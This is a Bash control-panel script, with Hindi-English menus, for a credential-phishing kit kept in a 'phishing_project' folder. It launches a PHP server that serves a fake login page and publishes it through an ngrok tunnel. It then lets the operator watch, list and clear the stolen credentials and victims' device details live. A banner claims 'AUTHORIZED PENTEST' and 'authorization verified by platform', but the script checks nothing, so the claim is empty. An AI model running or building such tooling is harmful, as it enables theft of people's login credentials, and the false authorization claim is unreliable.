#!/bin/bash

# === COLOR CODES ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
ORANGE='\033[0;33m'
DARK_GRAY='\033[1;30m'
LIGHT_RED='\033[1;31m'
LIGHT_GREEN='\033[1;32m'
LIGHT_BLUE='\033[1;34m'
LIGHT_PURPLE='\033[1;35m'
LIGHT_CYAN='\033[1;36m'
NC='\033[0m' # No Color

# === FUNCTIONS ===

show_banner() {
    clear
    echo -e "${RED}"
    echo "  ██╗    ██╗███████╗██████╗  ██████╗██╗   ██╗██████╗ ███████╗██████╗"
    echo "  ██║    ██║██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗"
    echo "  ██║ █╗ ██║█████╗  ██████╔╝██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝"
    echo "  ██║███╗██║██╔══╝  ██╔══██╗██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗"
    echo "  ╚███╔███╔╝███████╗██████╔╝╚██████╗   ██║   ██████╔╝███████╗██║  ██║"
    echo "   ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${LIGHT_BLUE}"
    echo "   █████╗ ███╗   ██╗███╗   ███╗ ██████╗ ██╗"
    echo "  ██╔══██╗████╗  ██║████╗ ████║██╔═══██╗██║"
    echo "  ███████║██╔██╗ ██║██╔████╔██║██║   ██║██║"
    echo "  ██╔══██║██║╚██╗██║██║╚██╔╝██║██║   ██║██║"
    echo "  ██║  ██║██║ ╚████║██║ ╚═╝ ██║╚██████╔╝███████╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}"
    echo "══════════════════════════════════════════════════════════════"
    echo -e "${LIGHT_PURPLE}              ⚡ W E B C Y B E R  •  A N M O L ⚡${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════════════════════"
    echo -e "${GREEN}          Ethical Security • Research • Development${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

show_auth_banner() {
    echo -e "${DARK_GRAY}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${DARK_GRAY}│${GREEN}  ✓ AUTHORIZED PENTEST - Permission Granted          ${DARK_GRAY}│${NC}"
    echo -e "${DARK_GRAY}│${GREEN}  ✓ Target: User-Declared Scope                       ${DARK_GRAY}│${NC}"
    echo -e "${DARK_GRAY}│${GREEN}  ✓ Authorization verified by platform                ${DARK_GRAY}│${NC}"
    echo -e "${DARK_GRAY}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

start_server() {
    show_banner
    show_auth_banner
    echo -e "${GREEN}  [✓] Tool Started Successfully!${NC}"
    echo ""

    cd ~/phishing_project

    pkill -f "php -S" 2>/dev/null
    chmod 777 logs/ 2>/dev/null
    chmod 666 logs/credentials.txt 2>/dev/null
    chmod 666 logs/credentials.json 2>/dev/null

    IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}')
    if [ -z "$IP" ]; then
        IP=$(ip a | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1)
    fi
    if [ -z "$IP" ]; then
        IP="127.0.0.1"
    fi

    nohup php -S 0.0.0.0:8081 > /dev/null 2>&1 &
    sleep 2

    echo ""
    echo -e "${CYAN}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${GREEN}               SERVER IS RUNNING                  ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}  [!]${NC} रिसीव करने के लिए URL:"
    echo -e "  ${LIGHT_CYAN}┌─────────────────────────────────────────────┐${NC}"
    echo -e "  ${LIGHT_CYAN}│${NC}  ${WHITE}http://$IP:8081${NC}                ${LIGHT_CYAN}│${NC}"
    echo -e "  ${LIGHT_CYAN}└─────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${YELLOW}  [!]${NC} क्रेडेंशियल्स यहाँ सेव होंगे:"
    echo -e "  ${ORANGE}  ~/phishing_project/logs/credentials.txt${NC}"
    echo ""
    echo -e "${DARK_GRAY}  ───────────────────────────────────────────────────${NC}"
    echo -e "${YELLOW}  [!]${NC} ${LIGHT_RED}Ctrl+C${NC} दबाएं सर्वर बंद करने के लिए"
    echo -e "${DARK_GRAY}  ───────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "${LIGHT_GREEN}  लाइव क्रेडेंशियल्स:${NC}"
    echo -e "${ORANGE}  ──────────────────────────────────────────────────${NC}"

    tail -f ~/phishing_project/logs/credentials.txt
}

view_logs() {
    while true; do
        show_banner
        show_auth_banner
        echo ""
        echo -e "${CYAN}  ┌─────────────────────────────────────────────┐${NC}"
        echo -e "${CYAN}  │${LIGHT_PURPLE}           CREDENTIALS LOGS MENU             ${CYAN}│${NC}"
        echo -e "${CYAN}  ├─────────────────────────────────────────────┤${NC}"
        echo -e "${CYAN}  │${NC}  ${YELLOW}[1]${NC} Live Logs          (लाइव देखें)        ${CYAN}│${NC}"
        echo -e "${CYAN}  │${NC}  ${YELLOW}[2]${NC} All Saved         (सभी क्रेडेंशियल)    ${CYAN}│${NC}"
        echo -e "${CYAN}  │${NC}  ${YELLOW}[3]${NC} JSON Format       (JSON देखें)        ${CYAN}│${NC}"
        echo -e "${CYAN}  │${NC}  ${YELLOW}[4]${NC} Device Info       (डिवाइस डिटेल)     ${CYAN}│${NC}"
        echo -e "${CYAN}  │${NC}  ${YELLOW}[5]${NC} Clear Logs        (लॉग्स हटाएं)       ${CYAN}│${NC}"
        echo -e "${CYAN}  │${NC}  ${YELLOW}[0]${NC} Main Menu         (वापस)             ${CYAN}│${NC}"
        echo -e "${CYAN}  └─────────────────────────────────────────────┘${NC}"
        echo ""
        read -p $'\e[33m  Option चुनें [0-5]: \e[0m' log_choice

        case $log_choice in
            1)
                echo ""
                echo -e "${YELLOW}  [!]${NC} नए क्रेडेंशियल्स का इंतज़ार करें..."
                echo -e "${YELLOW}  [!]${NC} ${LIGHT_RED}Ctrl+C${NC} दबाएं वापस जाने के लिए"
                echo -e "${ORANGE}  ──────────────────────────────────────────────────${NC}"
                echo ""
                tail -f ~/phishing_project/logs/credentials.txt
                ;;
            2)
                echo ""
                if [ -s ~/phishing_project/logs/credentials.txt ]; then
                    echo -e "${GREEN}  Saved Credentials:${NC}"
                    echo -e "${ORANGE}  ──────────────────────────────────────────────────${NC}"
                    cat ~/phishing_project/logs/credentials.txt
                else
                    echo -e "${RED}  [✗] कोई credentials नहीं मिले!${NC}"
                fi
                echo ""
                read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
                ;;
            3)
                echo ""
                if [ -s ~/phishing_project/logs/credentials.json ]; then
                    echo -e "${GREEN}  JSON Format:${NC}"
                    echo -e "${ORANGE}  ──────────────────────────────────────────────────${NC}"
                    cat ~/phishing_project/logs/credentials.json
                else
                    echo -e "${RED}  [✗] कोई JSON data नहीं मिला!${NC}"
                fi
                echo ""
                read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
                ;;
            4)
                echo ""
                if [ -s ~/phishing_project/logs/device_info.txt ]; then
                    echo -e "${GREEN}  Device Information:${NC}"
                    echo -e "${ORANGE}  ──────────────────────────────────────────────────${NC}"
                    cat ~/phishing_project/logs/device_info.txt
                else
                    echo -e "${RED}  [✗] कोई device info नहीं मिली!${NC}"
                fi
                echo ""
                read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
                ;;
            5)
                echo ""
                echo -e "${YELLOW}  [!] Logs clear की जा रही हैं...${NC}"
                > ~/phishing_project/logs/credentials.txt
                > ~/phishing_project/logs/credentials.json
                > ~/phishing_project/logs/device_info.txt 2>/dev/null
                echo -e "${GREEN}  [✓] सभी logs clear कर दिए गए!${NC}"
                sleep 2
                ;;
            0)
                return
                ;;
            *)
                echo ""
                echo -e "${RED}  [✗] गलत option! फिर से चुनें.${NC}"
                sleep 2
                ;;
        esac
    done
}

start_ngrok_tunnel() {
    show_banner
    show_auth_banner
    echo ""
    echo -e "${CYAN}  ┌─────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}  │${LIGHT_PURPLE}           NGROK TUNNEL SETUP                ${CYAN}│${NC}"
    echo -e "${CYAN}  └─────────────────────────────────────────────┘${NC}"
    echo ""

    if ! pgrep -f "php -S" > /dev/null; then
        echo -e "${RED}  [✗] PHP Server नहीं चल रहा!${NC}"
        echo -e "${YELLOW}  [!] पहले Server Start करें [Menu Option 1]${NC}"
        echo ""
        read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
        return
    fi

    if ! command -v ngrok &> /dev/null; then
        echo -e "${RED}  [✗] Ngrok installed नहीं है!${NC}"
        echo ""
        echo -e "${YELLOW}  Install करने का तरीका:${NC}"
        echo -e "${DARK_GRAY}  ────────────────────────────────────────${NC}"
        echo -e "  ${WHITE}cd ~${NC}"
        echo -e "  ${WHITE}wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz${NC}"
        echo -e "  ${WHITE}tar xzf ngrok-v3-stable-linux-arm64.tgz${NC}"
        echo -e "  ${WHITE}./ngrok config add-authtoken YOUR_TOKEN${NC}"
        echo -e "  ${WHITE}mv ngrok /data/data/com.termux/files/usr/bin/${NC}"
        echo -e "${DARK_GRAY}  ────────────────────────────────────────${NC}"
        echo ""
        read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
        return
    fi

    echo -e "${GREEN}  [+] Ngrok tunnel शुरू हो रहा है...${NC}"
    echo -e "${GREEN}  [+] Public URL नीचे दिखेगा, उसे copy कर लें${NC}"
    echo ""
    echo -e "${ORANGE}  ──────────────────────────────────────────────────${NC}"
    ngrok http 8081
}

stop_services() {
    show_banner
    echo ""
    echo -e "${YELLOW}  [!] Services बंद की जा रही हैं...${NC}"

    pkill -f "php -S" 2>/dev/null
    pkill -f ngrok 2>/dev/null

    sleep 1
    echo -e "${GREEN}  [+] PHP Server: ${LIGHT_RED}STOPPED${NC}"
    echo -e "${GREEN}  [+] Ngrok Tunnel: ${LIGHT_RED}STOPPED${NC}"
    echo ""
    echo -e "${CYAN}  ──────────────────────────────────────────────${NC}"
    echo -e "${GREEN}  ✓ All Services Stopped Successfully${NC}"
    echo -e "${CYAN}  ──────────────────────────────────────────────${NC}"
    echo ""
    read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
}

show_help() {
    show_banner
    show_auth_banner
    echo ""
    echo -e "${CYAN}  ┌─────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}  │${LIGHT_PURPLE}              HELP / मदद                    ${CYAN}│${NC}"
    echo -e "${CYAN}  ├─────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}  │${NC}                                             ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}📁${NC} Project: ~/phishing_project            ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}🌐${NC} Port: 8081                            ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}📄${NC} Login: index.html                      ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}🎨${NC} Style: style.css                       ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}⚡${NC} Script: script.js                      ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}🖥️${NC} Backend: server/login.php              ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${WHITE}💾${NC} Logs: logs/credentials.txt             ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}                                             ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[1]${NC} Server Start → सर्वर चालू होगा     ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[2]${NC} View Logs → क्रेडेंशियल्स देखें    ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[3]${NC} Ngrok → बाहर से access             ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[4]${NC} Stop → सब बंद करें                ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}                                             ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_CYAN}Local URL:${NC} http://IP:8081                ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_CYAN}Ngrok URL:${NC} https://xxxx.ngrok.app        ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}                                             ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${DARK_GRAY}💡 Quick: alias phish='cd ~/phishing_         ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${DARK_GRAY}  project && ./tool.sh'                       ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${DARK_GRAY}  फिर बस 'phish' टाइप करें                   ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}                                             ${CYAN}│${NC}"
    echo -e "${CYAN}  └─────────────────────────────────────────────┘${NC}"
    echo ""
    read -p $'\e[90m  Enter दबाएं वापस जाने के लिए...\e[0m'
}

# === MAIN PROGRAM ===

# पहली बार permissions
chmod 777 ~/phishing_project/logs/ 2>/dev/null

while true; do
    show_banner
    show_auth_banner
    echo ""
    echo -e "${CYAN}  ┌─────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}  │${LIGHT_PURPLE}              MAIN MENU                      ${CYAN}│${NC}"
    echo -e "${CYAN}  ├─────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[1]${NC} 🚀  Server Start (सर्वर चालू)      ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[2]${NC} 📊  View Logs (क्रेडेंशियल्स)      ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[3]${NC} 🌍  Ngrok Tunnel (बाहर से)         ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[4]${NC} 🛑  Stop Services (बंद करें)       ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[5]${NC} ❓  Help (मदद)                     ${CYAN}│${NC}"
    echo -e "${CYAN}  │${NC}  ${LIGHT_GREEN}[0]${NC} 🚪  Exit (बाहर निकलें)             ${CYAN}│${NC}"
    echo -e "${CYAN}  └─────────────────────────────────────────────┘${NC}"
    echo ""
    read -p $'\e[33m  Option चुनें [0-5]: \e[0m' choice

    case $choice in
        1) start_server ;;
        2) view_logs ;;
        3) start_ngrok_tunnel ;;
        4) stop_services ;;
        5) show_help ;;
        0)
            show_banner
            echo ""
            echo -e "${CYAN}  ────────────────────────────────────────────${NC}"
            echo -e "${LIGHT_PURPLE}     ⚡ W E B C Y B E R  •  A N M O L ⚡${NC}"
            echo -e "${GREEN}     धन्यवाद! बाद में फिर मिलेंगे 👋${NC}"
            echo -e "${CYAN}  ────────────────────────────────────────────${NC}"
            echo ""
            exit 0
            ;;
        *)
            echo ""
            echo -e "${RED}  [✗] गलत option! कृपया 0-5 के बीच चुनें.${NC}"
            sleep 2
            ;;
    esac
done
